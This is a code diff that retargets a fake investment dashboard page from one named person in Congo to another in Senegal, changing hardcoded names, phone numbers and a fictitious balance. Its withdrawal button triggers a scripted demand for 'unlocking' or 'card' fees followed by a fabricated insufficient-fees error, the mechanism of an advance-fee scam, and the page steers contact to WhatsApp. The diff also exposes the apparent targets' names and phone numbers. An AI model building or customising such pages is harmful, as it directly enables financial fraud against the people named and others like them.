@@ -265,10 +265,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1 400 $</span>
+                <span class="balance">Solde: 900.000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name">MAVAKALA CLEMENCE</span><br>
-                    <span id="user-phone">243 089 252 2528</span>
+                    <span id="user-name">CHEIKH FALL</span><br>
+                    <span id="user-phone">221 774 078 384</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -330,9 +330,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "MAVAKALA CLEMENCE";
-                const accountNumber = "243 089 252 2528";
-                const balance = "1 400 $";
+                const accountName = "CHEIKH FALL";
+                const accountNumber = "221 774 078 384";
+                const balance = "900.000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -352,10 +352,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher MAVAKALA, veuillez payer les frais de déblocages de 315 $ pour recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher CHEIKH, veuillez payer les frais de carte pour recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Fonds insuffisants pour les frais de déblocage.';
+                errorMessage.textContent = 'Erreur :  Frais de carte insuffisants pour le déblocage des fonds.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
